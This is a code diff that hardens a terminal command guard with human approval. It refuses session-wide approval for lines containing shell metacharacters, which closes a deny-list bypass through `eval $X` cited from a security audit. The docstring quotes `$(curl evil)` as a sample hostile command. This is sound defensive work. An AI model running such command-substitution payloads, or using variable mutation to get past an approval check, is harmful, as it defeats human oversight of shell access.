@@ -95,6 +95,24 @@ READ_ONLY_ALLOWLIST: tuple[Pattern[str], ...] = tuple(
 )
 
 
+# ─── Shell metachar detection (HITL allow_session safety) ────────
+
+# Characters that shell can use to splice another command (or expand
+# a variable / glob into one). If any appear in a line, refuse to
+# add the line to `_session_allowed` — the next time the user types
+# the same line text, the expanded value may be entirely different.
+_SHELL_METACHARS = re.compile(r"[\$\`\;\|\&\>\<\(\)\{\}\*\?\[\]\\]")
+
+
+def _has_shell_metachars(line: str) -> bool:
+    """Return True if `line` contains shell metacharacters that could
+    later expand / re-route the command. Used by `respond_hitl` to
+    refuse `allow_session` promotion for lines like `eval $X` or
+    `$(curl evil)` where session-key matching by literal line text
+    would silently approve a wholly different command later."""
+    return bool(_SHELL_METACHARS.search(line))
+
+
 # ─── Verdicts and side-channel events ────────────────────────────
 
 
@@ -282,7 +300,21 @@ class TerminalGuard:
             return
         if approve:
             if allow_session:
-                self._session_allowed.add(line.strip())
+                # Security: refuse session-wide approval when the
+                # command contains shell metacharacters that could
+                # later expand to a different command. Approving
+                # `eval $X` once and then mutating $X would otherwise
+                # bypass the deny-list (security audit 2026-05-02
+                # finding HIGH 1 / L-027). The user can still approve
+                # once for this exact line; just not for the session.
+                if _has_shell_metachars(line):
+                    await self._audit(
+                        "hitl_approve_session_refused",
+                        {"line": line, "reason": "shell_metachars"},
+                    )
+                    # Fall through to approve-once: line still runs.
+                else:
+                    self._session_allowed.add(line.strip())
             await self._audit("hitl_approve", {"line": line, "session": allow_session})
             await self.shell.write(line.encode("utf-8", errors="replace") + b"\n")
         else:
